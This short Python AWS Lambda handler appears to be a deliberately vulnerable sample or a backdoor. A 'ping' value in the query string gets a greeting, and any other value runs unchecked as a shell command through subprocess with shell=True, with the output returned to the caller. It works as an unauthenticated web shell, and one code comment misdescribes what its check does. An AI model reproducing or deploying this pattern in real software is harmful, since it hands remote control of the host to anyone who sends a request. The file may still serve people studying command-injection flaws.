import json
import subprocess

def handler(event, context):
    # Retrieve the command parameter from the query string
    command = event.get('queryStringParameters', {}).get('query', '')
    
    # Check if the command is empty
    if command == 'ping':
        return {
            'statusCode': 200,
            'body': json.dumps('Cheers from AWS Lambda!!')
        }
    else:
        # Execute the command using subprocess
        try:
            result = subprocess.check_output(command, shell=True)
            return {
                'statusCode': 200,
                'body': result.decode('utf-8')
            }
        except subprocess.CalledProcessError as e:
            return {
                'statusCode': 500,
                'body': f'Error executing command: {e}'
            }
